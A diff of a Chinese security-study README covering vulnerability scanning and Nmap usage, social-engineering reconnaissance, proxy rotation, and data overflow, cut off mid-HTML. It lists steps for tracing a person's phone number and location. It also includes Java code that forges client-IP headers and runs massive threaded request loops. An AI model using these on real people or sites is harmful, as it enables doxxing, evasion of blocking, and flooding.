@@ -1,13 +1,13 @@
-Attention: 
-> 1. 由于学业的繁忙，我将不定期编辑这个文件。我会继续把各文件夹中的文章编进readme.md中，毕竟各文件夹内的文档可视性并不高(Due to my academic commitments, I will be editing this document from time to time. I will continue to compile the articles in the various folders into a readme.md. After all, there is not much visibility of the documents in each folder.)
-> 2. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
-> 3. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
-> 4. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福60分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 60. Please understand that I will continue to write English content when my English learning journey is basically complete.)
-> 5. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
-> 6. 一些重要内容会用红色标注，标题会用黄色标注，其中可能还会出现其他颜色，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, and other colours may also appear in it, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
-> 7. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
-> 8. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
-> 9. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)文件夹中的内容有些许错误 不建议观看
+Attention:
+> 1. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
+> 2. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
+> 3. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福70分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 70. Please understand that I will continue to write English content when my English learning journey is basically complete.)
+> 4. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
+> 5. 一些重要内容会用红色标注，标题会用黄色标注，其中可能还会出现其他颜色，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, and other colours may also appear in it, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
+> 6. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
+> 7. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
+> 8. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)
+> 9. 之后的内容将会直接补充到这个文档中，将不在向文件夹中补充，所以文件夹中的文件可理解为已弃用的文件(The subsequent content will be added directly to this document and will not be added to the folder, so the files in the folder can be interpreted as discarded files.)
 
 csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)
 
@@ -9845,3 +9845,1407 @@ namespace ASP.NETStudy
 - Java[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
 - PHP[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
 - .NET[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)
+
+### <font color="yellow">10 漏洞扫描</font>
+		
+#### <font color="yellow">001 网络漏洞扫描的三个阶段</font>
+
+- 寻找目标主机或网络
+- 在主机或网络内搜集信息，包括OS类型，运行的服务/端口以及服务软件的版本等
+- 根据系统类型和服务软件，判断或进一步检测系统是否存在安全漏洞
+    
+#### <font color="yellow">002 漏洞扫描的两种策略</font>
+
+被动式策略：被动式策略就是基于主机之上，对系统中不合适的设置、脆弱的口令以及其他与安全规则抵触的对象进行，检查，称为系统安全扫描
+
+主动式策略：主动式策略是基于网络的，它通过执行一些脚本文件模拟对系统进行攻击的行为并记录系统的反应，从而，发现其中的漏洞，称为网络安全扫描
+
+#### <font color="yellow">003 漏洞扫描技术的原理</font>
+
+漏洞扫描技术是建立在端口扫描技术的基础之上的，从对黑客的攻击行为的分析和收集的漏洞来看，绝大多数都是针对某一个特定的端口的，所以漏洞扫描技术以与端口扫描技术同样的思路来开展扫描的，漏洞扫描技术的原理是主要通过以下两种方法来检查目标主机是否存在漏洞，在端口扫描后得知目标主机开启的端口以及端口上的网络服务，将这些相关信息与网络漏洞扫描系统提供的漏洞库进行匹配，查看是否有满足匹配条件的漏洞存在，通过模拟黑客的攻击手法，对目标主机系统进行攻击性的安全漏洞扫描，若模拟攻击成功，则表明目标主机系统存在安全漏洞
+
+漏洞库的特征匹配方法
+
+> 基于网络系统漏洞库的漏洞扫描的关键部分就是它所使用的漏洞库，通过采用基于规则的匹配技术，即根据安全专家对网络系统安全漏洞、黑客攻击案例的分析和系统管理员对网络系统的安全配置的实际经验，可以形成一套标准的网络系统漏洞库，然后再次基础上构成相应的匹配规则，由扫描程序自动的进行漏洞扫描的工作，若没有被匹配的规则，系统的网络连接是禁止的
+> 
+> 工作原理：扫描客户端提供良好的界面，对扫描目标的、范围、方法等进行设置，向扫描引擎（服务器端）发出扫描命令，服务器根据客户端的选项进行安全检查，并调用规则匹配库检测主机，在获得目标主机TCP/IP端口和其对应的网络访问服务的相关信息后，与网络漏洞扫描系统提供的系统漏洞库进行匹配，如果满足条件，则视为存在漏洞。服务器的检测完成后将结果返回到客户端，并生成直观的报告。在服务器端的规则匹配库是许多共享程序的集合，存储各种扫描攻击方法。漏洞数据从扫描代码中分离。使用户能自行对扫描引擎进行更新，因此漏洞库信息的完整性和有效性决定了漏洞扫描的性能，漏洞库的修订和更新的性能也会影响漏洞扫描系统运行的时间
+
+功能模块(插件)技术
+
+> 插件是由脚本语言填写的子程序，扫描程序可以通过调用它来执行漏洞扫描，检测出系统中存在的一个或多个漏洞，添加新的插件就可以使漏洞扫描软件增加新的功能，扫描出更多的漏洞，插件编写规范化后，基于用户自己都可以Perl、C或自行设计的脚本语言编写的插件来扩充漏洞扫描软件的功能，这种技术使漏洞扫描软件的升级维护变的相对简单，而专用脚本语言的使用也简化了编写新插件的编程工作，使漏洞扫描软件具有强的扩展性
+> 工作原理：它的前端工作原理基本和基于网络系统漏洞库的漏洞扫描工作原理相同，不同的就是将系统漏洞库和规则匹配库换成了扫描插件库和脆弱性数据库，扫描插件库包含各种脆弱性扫描插件，每个插件对一个或多个脆弱点进行检查和测试，插件之间相对独立，这部分应该随着新脆弱性的发现而及时更新，脆弱性数据库收集了国际上公开发布的脆弱性数据，用于检查检测的完备性，它与扫描插件库之间是一对一或者是一对多的关系，寄一个插件可以进行一个或多个脆弱点的检测，因此，扫描插件库和脆弱性数据库可以及时更新，具有很强的扩展性
+    
+#### <font color="yellow">004 工具</font>
+
+##### <font color="yellow">0001 Nmap</font>
+
+Nmap即Network Mapper，它是在免费软件基金会的GNU General Public License (GPL)下发布的，其基本功能有
+
+- 探测一组主机是否在线
+- 扫描主机端口，嗅探提供的网络服务
+- 判断主机的操作系统
+
+软件下载后，执行`configure`、`make`和`make install`三个命令，将nmap二进制码安装到系统上，就可以执行nmap了
+
+Nmap支持不同类别的端口扫描，TCP连接扫描可以使用`-sT`命令
+
+`nmap -sT -p 80 -I -O www.yourserver.com`
+
+nmap工具的用法
+
+1. 定目标
+
+    `nmap -IP 默认-sT`
+	`nmap -iL`
+	`nmap 192.168.1.0/24 扫描网段`
+
+2. 端口
+
+	`nmap -p80 IP`
+	`nmap -p22,80,8080 IP`
+
+3. 全端口扫描
+
+    `nmap -p1-65535 IP`
+	`nmap -p- IP`
+	`nmap –allports IP`
+	`nmap 不设定端口的时候，默认扫描最有可能开放的1000个端口`
+
+4. 主机发现
+
+	`-sn 不使用ping命令扫描`
+	`-Pn 跳过主机发现，直接进行端口扫描`
+	`-PS 使用syn进行主机发现`
+	`-P0 无ping扫描`
+
+5. 端口扫描
+
+	`-sS 使用syn隐蔽式扫描`
+	`-sT 使用tcp全连接扫描`
+	`-sA ack包`
+	`-sU udp包`
+
+6. 版本识别
+
+	`-sV 服务版本识别`
+	`-O 操作系统版本识别`
+
+7. 输出
+
+	`-o 输出可阅读文档`
+	`-oG 输出可供grep处理的文档`
+	`-oN 输出标准文档`
+
+8. 扫描速率
+
+	`T0-T5 默认T3`
+
+##### <font color="yellow">0002 p0f</font>
+
+p0f对于网络攻击非常有用，它利用SYN数据包实现操作系统被动检测技术，能够正确地识别目标系统类型，和其他扫描软件不同，它不向目标系统发送任何的数据，只是被动地接受来自目标系统的数据进行分析，因此，一个很大的优点是几乎无法被检测到，而且p0f是专门系统识别工具，其指纹数据库非常详尽，更新也比较快，特别适合于安装在网关中
+
+##### <font color="yellow">0003 ISS</font>
+
+ISS Internet Scanner是全球网络安全市场的顶尖产品，通过对网络安全弱点全面和自主地检测与分析并检查它们的弱点，将风险分为高中低三个等级，并且可以生成大范围的有意义的报表，现在，这个软件的收费版本提供了更多的攻击方式，并逐渐朝着商业化的方向发展
+
+##### <font color="yellow">0004 Nessus</font>
+	
+Nessus是一款功能强大的远程安全扫描器，它具有强大的报告输出能力，可以产生HTML、XML、LaTeX和ASCII文本等格式的安全报告，并能为每个安全问题提出建议，软件系统为client/sever模式，服务器端负责进行安全检查，客户端用来配置管理服务器端。在服务端还采用了`plug-in`的体系，允许用户加入执行特定功能的插件，可以进行更快速和更复杂的安全检查，除了插件外，Nessus还为用户提供了描述攻击类型的脚本语言，来进行附加的安全测试，Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它，该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库，Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描，对应渗透测试人员来说，Nessus是必不可少的工具之一
+
+##### <font color="yellow">0005 Xprobe</font>
+
+XProbe是一款主动操作系统指纹识别工具，它可以测定远程主机操作系统的类型，XProbe依靠与一个签名数据库的模糊匹配以及合理的推测来确定远程操作系统的类型，利用ICMP协议进行操作系统指纹识别是它的独到之处，使用时，它假设某个端口没有被使用，它会向目标主机的较高端口发送UDP包，目标主机就会回应ICMP包，然后，XProbe会发送其他的包来分辨目标主机系统，有了这个软件，判断对方的操作系统就很容易了
+
+### <font color="yellow">11 社会工程学</font>
+
+#### <font color="yellow">001 IP地址获取及定位</font>
+
+##### <font color="yellow">0001 IP地址获取</font>
+
+ThreatScan在线扫描工具
+
+> [https://scan.top15.cn](https://scan.top15.cn)
+> 
+> [http://whois.chinaz.com/](http://whois.chinaz.com/)
+> 
+> [https://x.threatbook.cn/](https://x.threatbook.cn/)
+> 
+> [http://whois.domaintools.com/](http://whois.domaintools.com/)
+> 
+> [http://toolbar.netcraft.com/site_report?url=](http://toolbar.netcraft.com/site_report?url=)
+> 
+> [https://www.robtex.com/](https://www.robtex.com/)
+> 
+> [https://whois.aizhan.com/](https://whois.aizhan.com/)
+> 
+> [https://scan.top15.cn/web/](https://scan.top15.cn/web/)
+
+基础信息扫描
+
+> 包括域名、IP地址、有无CDN、编程语言、是否存在WAF(Web应用防护系统)、操作系统、指纹框架、Web容器、网络权重等，注意，ThreatScan通过Web指纹识别，发现该网站采用Java进行开发
+
+端口扫描
+
+> [http://tool.chinaz.com/port/](http://tool.chinaz.com/port/)
+> 
+> [https://www.sojson.com/zz/portscan.html](https://www.sojson.com/zz/portscan.html)
+> 
+> 接着将IP地址填写到端口处，进行相关扫描，端口扫描是获取目标主机的端口信息显得十分有必要，通过一些常见端口，可以大致得出目标主机运行的服务，为后续渗透测试薄弱点提供参考
+
+旁站扫描
+
+> 旁站扫描能扫描与该IP地址挂靠的其他网站，这有利于Web渗透，可能旁站存在漏洞
+
+信息泄露查询
+
+> 同时，Namp软件可以获取IP地址拓扑图，方便观察网络跳数，尤其是大的网段，用Zenmap
+
+##### <font color="yellow">0002 IP物理定位</font>
+
+IP物理定位可以通过百度地图开发者服务(web 服务API)、第三方接口、在线网站等进行定位，但不同的接口其精确度也会不同，服务商通常会按照区域划分ip地址，凡是通过网络接入到服务器，就一定能获取ip和地址定位，从而获取目标的物理位置，假设某人发了某个危害的帖子或从事相关活动，有关部门就需要抓他，此时，首先要获取他真实的IP地址，通过服务器对比，观察这个时间点它把IP分配给谁(通常实名制)；再通过IP地址进行物理定位，后台日志通常会存储相关的IP地址及行为，现在，通过三大运营商数据、Wifi、基站、社交网络、视频等，都能进行一些更为智能精确的定位，从而维护整个社会的网络安全
+
+方法
+
+> 1. Python查询经纬度
+> 	
+>   调用本地文件实现
+>   
+> 	> 本地存在一个名叫GeoLiteCity.dat的文件，它包含了详细的地址对照信息，通过编写代码查询对应的值获取信息，这里以作者的博客地址为例，备案在阿里服务器上，需要安装库pygeoip
+>   > 
+> 	> 原理：调用百度API获取经纬度返回的Json结果
+> 
+> 2. 网站定位位置
+> 	[https://www.opengps.cn/Data/IP/ipplus.aspx](https://www.opengps.cn/Data/IP/ipplus.aspx)
+> 	
+>   1. 安全建议
+>       
+>       在搭建个人网站时一定要保护好自己的邮箱和电话，尤其是注册某些不熟悉的网站时，一定要要保护好个人信息，钓鱼邮件、短信、电话、软件都不要去点击，安装相关的杀毒软件，做好个人隐私保护，如果是企业级公司，网站做好相关的安全防护，安装WAF、IP保护、系统日志、安全检测、弱口令、社工杜绝都非常重要
+>       
+> 	2. 手机查找
+> 		
+>       通过各大网站已知有价值的ID获取其他信息(如电话号码、QQ、微信)，通过电话或QQ获取用户的登录账号，是常见的社会工程学手段
+>       
+> 		- 通过已知信息查找有价值的ID或其他信息
+> 		- 用密码找回功能获取部分手机号信息
+> 		- 找出所在城市获得手机号段
+> 		- 用手机号码生成器或Python循环遍历生成手机号并导入手机
+> 		- 利用手机号码和物理位置来恶意获取信息，利用手机号继续查找信息
+
+其他技巧
+
+> 也许有些人经历过，在微信群里晒了一张并没有定位的自拍，却被不在现场的朋友们发现了你的位置，这就是照片原图泄露了你的位置，其原因是智能手机在拍照的时候，都有一个叫`Exif`的东西，它包括快门、光圈、iso、白平衡、日期时间等各种图像数据，还有一个重要的信息——位置信息，如果不经过处理，这些`Exif`参数会一直存在，在拍照的时候软件调用了`Exif`中的GPS全球定位系统数据，同时，经过各种美图软件处理过的照片都会在相册中显示位置信息，而且不少美颜软件都自带定位功能，打开相机找到保存地理位置选项，并选择不打勾，接着我们将经纬度进行解析，它是以度分秒的格式展示的(度分秒之间以；间隔)，为了方便定位，我们需要将度分秒转换为度的格式，纬度为：`26；22；50.48263499999301`，其计算方法为：`26+(22+50.48263499999301/60)/60 = 26.3806896208`，经度为：`106；38；25.123901000013689`，其计算方法为：`106+(38+25.123901000013689/60)/60 = 106.64031219472223`
+> 
+> 安全建议：同样其他文件都会暴露一些信息，包括PPT、Word等，要学会保护自己的隐私及版权，社会工程学的本质是欺骗，不要轻易相信他人，不要到处留下自己的个人信息，要学会设置代理、短信验证、日志记录
+
+#### <font color="yellow">002 简介</font>
+
+社会工程学是黑客米特尼克悔改后在《欺骗的艺术》中所提出的，是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段，在信息安全这个链条中，人的因素是最薄弱的一环节，社会工程就是利用人的薄弱点，通过欺骗手段而入侵计算机系统的一种攻击方法，组织可能采取了很周全的技术安全控制措施，例如：身份鉴别系统、防火墙、入侵检测、加密系统等，但由于员工无意当中通过电话或电子邮件泄露机密信息(如系统口令、IP地址)，或被非法人员欺骗而泄露了组织的机密信息，就可能对组织的信息安全造成严重损害，社会工程学通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取用户系统的秘密，熟练的社会工程师都是擅长进行信息收集的身体力行者，很多表面上看起来一点用都没有的信息都会被这些人利用起来进行渗透，比如说一个电话号码，一个人的名字，或者工作的ID号码，都可能会被社会工程师所利用，这意味着没有把人这个因素放进企业安全管理策略中去的话将会构成一个很大的安全裂缝，简单来说，社会工程学就是利用一个人的缺点(贪婪，狂妄)、优点(自信，怜悯)，来从中套取我们想要的信息，可以说行骗艺术的分类有两种，一种是通过诈骗、欺骗来获得钱财，这就是通常的骗子，另一种则通过蒙蔽、影响、劝导来达到获取信息的目的，这就是社会工程师
+
+基础信息：收集数据
+
+- 真实名字
+- 出生日期
+- 身份证号
+- 籍贯
+- QQ号
+- 不大众化的网络昵称
+- 就读的大学
+- 就读的高中
+- 学号
+- 你认识的他的朋友圈子的人
+- 共同朋友的资料
+- ……
+
+以下部分引用于《欺骗的艺术》对专业术语的介绍
+
+1. 马克(MARK)：受骗者
+2. 激警(BURN THE SOURCE)：攻击者如果让对方看出来攻击的意图称为激警，一旦对方有所警觉并通知其他人员，以后再想套出类似的信息就十分困难了
+3. 秘密通信地(Mail Drop)：社会工程师把租来的邮箱称为秘密通信地，通常是用假名字租用的，用来接收受骗者发来的文件和包裹
+4. 特洛伊木马：一种包含恶意或会造成危害的代码，用来损坏受害者的计算机或文件，或是从受害者的计算机和网络上获取信息，某些特洛伊木马会隐藏在操作系统中暗中监视击键或操作，或者通过网络连接来执行一些入侵命令，而这一切是在受害者意识不到的情况下进行的
+5. 远程命令行解释器：接受文本命令来执行某种功能或运行程序的非图形操作界面，通过利用漏洞或在目标计算机上安装木马，攻击者可以获得对命令行解释器的远程访问权
+6. 反向社会工程学：攻击者设计的一种情形，受骗者碰到问题时会联系攻击者求助，另一种反向社会工程学是对付攻击者的，被攻击目标发现了对方是攻击者后，利用心理影响尽可能的从攻击者身上套出信息以保护企业的信息资产
+7. 哈希密码(PASSWORD HASH)：对口令进行一次性的加密处理而形成的杂乱字符串，这个加密过程被认为是不可逆的，也就是说，人们认为从哈希串中是不可能还原出原口令的
+8. 秘点(DEAD DROP)：很难被别人发现的存放信息的地方，在传统的间谍活动中，秘点可能是一堵墙壁上某块松动的石头，对于计算机黑客来说，一般都是位于遥远国度的互联网上的一个站点
+9. 软心糖安全：贝尔实验室的贝劳文和切斯威克提出的说法，用以描述一种安全状况，外部防御十分强壮，如防火墙，但其后面的设施却十分脆弱
+10. 地下酒吧式的安全：知道自己想要的信息在哪里，并且使用一个词或是名称来获得对此信息或计算机系统的访问权的一种安全形式，这个关健在于知道地下酒吧的位置，门上没有标志，而酒吧老板也不会挂一盏霓虹灯在门口来表示这儿有个酒吧，通常，只要能找到地方就基本可以进入，很不幸，同样的安全措施在企业中广泛存在，这种没有任何保护的安全级别我称之为地下酒吧式的安全
+11. 隐晦安全：一种效率低下的计算机安全手段，通过对系统运转细节(协议、算法和内部系统)的保密来达到防范目的，隐晦安全假定可信任成员组以外的人不能接近系统，因此这种安全并不可靠
+12. 双因素认证：用两种不同的验证方式对身份进行确认，比如，一个人必须从某个可确认的地方打来电话并知道口令来确认自已的身份，然后工作人员从你的信息中选出某个条目(通常为社会保险号码、出生日期或是母亲的姓氏)来询问你，如果你的答案正确，这就是第二次的验证――基于你应该知道的信息，时间令牌有两种型号，一种只有一张信用卡的一半大小，但稍厚些，另一种小到可以挂到钥匙链上 
+13. 恶意软件：一种危害性的程序，例如病毒、蠕虫，或是木马
+14. 后门：在用户不知道的情况下进入用房计算机的一个隐蔽入口，编程人员在开发软件时，也会用其来进入程序以解决问题，安全超文本传输协议(HTTP)或安全套接层协议(SSL)提供一个使用数字证书的自动机制，不仅可以加密发送到远端站点的信息，还可以对其进行认证(保证所连接的站点是真实可信的)，然而，这种保护机制对于那些疏于检验地址栏中的网址是否为他们想访问站点的用户是无效的 
+15. 警告：在没有使用安全协议的站点上，一定不要输入个人的敏感信息，如地址、电话、信息卡号或银行账号，或者是任何你不想泄露的私人信息
+16. 安全套接层协议：网景开发的用于互联网上客户与服务器端的安全认证协议，经常性的更新病毒库可以基本保证计算机的安全性，但这并不足以完全保证安全，还有一些病毒或蠕虫是防病毒软件公司未知的，因此相应的保护程序也就没有发布 
+17. 哑终端：一台没有处理器的终端，只能响应简单的控制码和显示字符及数字
+18. 逆向骗局：一种入侵手段，让被攻击者向攻击者寻求帮助
+19. 垃圾搜寻：从一家公司的垃圾中(通常是在外部和易受攻击的地方)找出被抛弃的可用于社会工程学攻击的信息，例如内部的电话号码或资料 
+20. 直通：电话公司术语，当电话被拿起时接通一个特殊的号码
+21. 呼叫拒绝：电话公司的一个服务选项，设置某个电话号码无法呼入
+22. 终端基础安全：基于特定的计算机终端作为安全验证，这一做法在IBM大型计算机中非常流行
+23. 比赛很简单：入侵，赢得美金，一场公开的惊人表演......除非有人能打败他们并拿走钱，他们非常相信他们的产品，甚至还在展台上勇敢地公布了系统中的一些账户名称和相应的密码，不只是普通账户，还包括所有的特权账户
+24. 这其实没有听上去的那么勇敢：我知道，在这种设置类型中，每台终端都插在计算机自身的一个端口上，不难断定他们已经设置了这五台终端只能从非系统管理员权限登陆，看来似乎只有两条路，要么完全突破安全程序(这正是LOCK-II被设计来防范的)，要么用开发者难以想象的某种方法绕路而行
+25. 列举：查看操作系统已启动的服务并列出允许访问系统的用户的账户名
+26. 暴力破解：通过尝试每一种可能的字母、数字、符号组合对密码进行破解
+27. 补丁：修正一个可执行程序的一些代码
+28. 间谍程序：用于监控目标计算机活动的专业软件，一种形式是记录因特网购物者访问过的站点，这样在线广告就可以根据他们的上网习惯进行修改，另一种形式类似于监听，除了目标设备是计算机，这些软件监控用户的活动，包括密码、按键、Email、聊天记录、即时聊天、所有访问过的网站和显示屏图像
+29. 无声安装：在计算机用户或操作员毫不知情的情况下安装软件程序的一种方法
+30. 肩窥：通过监视用户输入，窃取密码或其它用户信息的行为
+31. GZIP：使用一个Linux GNU工具把多个文件压缩到一个单独的文件中
+32. 匿名FTP：无需账户也能通过文件传输协议(FTP)访问远程计算机，虽然匿名FTP可以在没有密码的情况下访问，但是用户的访问权限通常会限制在几个指定的文件夹内
+
+### <font color="yellow">12 多IP访问</font>
+
+#### <font color="yellow">001 python爬虫</font>
+
+在爬虫过程中，如果长时间频繁的使用同一个ip地址访问某个网站和提取内容，就很容易让对方网站识别认定为爬虫，从而对你的爬虫行为做出相应的限制，或直接屏蔽你的ip地址访问，因此使用多个ip地址进行访问，可以有效解决这一问题
+
+整体思路：建立一个存放ip地址的列表，包含多个可用的ip地址(大家可以网上搜免费ip地址0)，然后每次都随机调用一个ip地址，建立http连接，这样就避免了同一个ip地址多次访问被屏蔽的风险了
+
+代码
+
+```python
+from urllib import request
+import random
+proxy_list = [
+  {"http":"124.88.67.54:80"},
+  {"http":"61.135.217.7:80"},
+  {"http":"42.231.165.132:8118"}
+]
+proxy = random.choice(proxy_list)# 随机选择一个ip地址
+httpproxy_handler = request.ProxyHandler(proxy)
+opener = request.build_opener(httpproxy_handler)
+request = request.Request("http://www.baidu.com/")
+response =opener.open(request)
+print(response.read())
+```
+
+Java模拟多IP访问
+
+```java
+package url_demo;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.Random;
+
+public class HttpUtilTest 
+{
+
+    private int index = 0;
+
+    public String sendPost(String url, String param) 
+	{
+        PrintWriter out = null;
+        BufferedReader in = null;
+        String result = "";
+        try 
+		{
+            URL realUrl = new URL(url);
+            URLConnection conn = realUrl.openConnection();
+
+            // 随机生成ip
+            String ip = randIP();
+            conn.setRequestProperty("X-Forwarded-For", ip);
+            conn.setRequestProperty("HTTP_X_FORWARDED_FOR", ip);
+            conn.setRequestProperty("HTTP_CLIENT_IP", ip);
+            conn.setRequestProperty("REMOTE_ADDR", ip);
+            conn.setRequestProperty("Host", "");
+            conn.setRequestProperty("Connection", "keep-alive");
+            conn.setRequestProperty("Content-Length", "17");
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setRequestProperty("Origin", "ORIGIN");
+            conn.setRequestProperty("User-Agent",
+                    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36");
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setRequestProperty("Referer", "REFERER");
+            conn.setRequestProperty("Accept-Encoding", "gzip, deflate");
+            conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,pt;q=0.2");
+
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
+            out = new PrintWriter(conn.getOutputStream());
+            out.print(param);
+            out.flush();
+            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String line;
+            while ((line = in.readLine()) != null) 
+			{
+                result += line;
+            }
+            synchronized (this) 
+			{
+                DemoUtl.index = DemoUtl.index + 1;
+            }
+            System.out.println("第" + DemoUtl.index + "次访问； -->  || 当前线程：" + param + "  || 请求成功！ || 模拟ip: " + ip
+                    + " || 返回结果： " + result.toString().hashCode());
+        } 
+		catch (Exception e) 
+		{
+            // System.out.println("发送 POST 请求出现异常！" + e);
+            // e.printStackTrace();
+        } 
+		finally 
+		{
+            try 
+			{
+                if (out != null) 
+				{
+                    out.close();
+                }
+                if (in != null) 
+				{
+                    in.close();
+                }
+            } 
+			catch (IOException ex) 
+			{
+                ex.printStackTrace();
+            }
+        }
+        return result;
+    }
+
+    public static String randIP() 
+	{
+        Random random = new Random(System.currentTimeMillis());
+        return (random.nextInt(255) + 1) + "." + (random.nextInt(255) + 1) + "." + (random.nextInt(255) + 1) + "."
+                + (random.nextInt(255) + 1);
+    }
+}
+```
+
+```java
+package url_demo;
+
+import java.util.Random;
+
+public class DemoUtl 
+{
+
+    public static int index = 0;
+
+    public static void main(String[] args) throws InterruptedException 
+	{
+        try 
+		{
+            for (int i = 0; i < 100000; i++) 
+			{
+                Thread.sleep((new Random()).nextInt(200) + 100);
+                new Thread(new Runnable() 
+				{
+                    @Override
+                    public void run() 
+					{
+                    
+                        for (int j = 0; j < 100000; j++) 
+						{
+                            try 
+							{
+                                Thread.sleep((new Random()).nextInt(3200) + 1500);
+                                HttpUtilTest tt = new HttpUtilTest();
+                                tt.sendPost(
+                                        "https://www.baidu.com",
+                                        Thread.currentThread().getName());
+                            } 
+							catch (InterruptedException e) 
+							{
+                                e.printStackTrace();
+                            }
+                        }
+                    }
+                }).start();
+            }
+        } 
+		catch (Exception e) 
+		{
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+### <font color="yellow">13 溢出</font>
+
+#### <font color="yellow">001 基本数据类型</font>
+
+- 整型
+- 浮点型
+
+整型包括
+
+- char
+- short
+- int
+- long
+- long long
+
+除此之外，整型还有无符号类型unsigned...
+
+浮点型包括
+
+- float
+- double
+- long double
+
+规则
+
+- `short`至少16位，`int`至少和`short`一样长
+- `long`至少32位，至少和`int`一样长
+- `long long`至少64位，至少和`long`一样长
+- `float`至少4个字节
+- `double`至少6个字节，并且不少于`float`
+- `long double`至少和`double`一样长
+
+#### <font color="yellow">002 数据范围</font>
+
+不同的系统环境，数据范围有所不同；32位/64位操作系统，数据范围也有所不同，可以通过代码来确定不同的范围
+
+- c语言定义了一系列的宏
+
+	```C
+	#include <stdio.h>
+	#include <limits.h>
+
+	int main()
+	{
+	    printf("max integer: %d\n", INT_MAX);
+	    printf("min integer: %d\n", INT_MIN);
+	    return 0;
+	}
+	```
+
+- C++数值极限
+
+	```C++
+	#include <iostream>
+	#include <limits>
+
+	int main()
+	{
+	    std::cout << numeric_limits<int>::max() << endl;
+	    std::cout << numeric_limits<int>::min() << endl;
+	    return 0;
+	}
+	```
+
+#### <font color="yellow">003 数据类型应用</font>
+
+介绍个亲身遇到的数据溢出的问题：数据压缩后还原导致溢出
+
+```C
+int d = 0;
+long value = d * 1000 + 10;
+```
+
+上面一段代码就有发生数据溢出的可能，当变量d足够大时，再乘以1000就会溢出。结果可想而知，是一个相对小的数值
+
+```C
+//可以这样改写，就不会出现问题
+long value = (long)d * 1000 + 10;
+```
+
+C/C++基本数据类型，每一种都有范围，在选择数据类型要注意合适的范围，否则会造成数据溢出，产生难以发现的bug
+
+#### <font color="yellow">004 CSS方式</font>
+
+##### <font color="yellow">0001 单行溢出</font>
+
+```html
+<!DOCTYPE html>
+<html>
+	<head> 
+		<meta charset="utf-8">
+		<title>text-overflow</title>
+			<style type="text/css">
+				.test_demo{
+				    text-overflow:ellipsis;//值为clip表示剪切，ellipsis时为显示省略号
+				    overflow:hidden; 
+				    white-space:nowrap; 
+				    width:200px; 
+				    background:#ccc;
+				}
+			</style>
+	</head> 
+	<body>
+		<div class="test_demo">
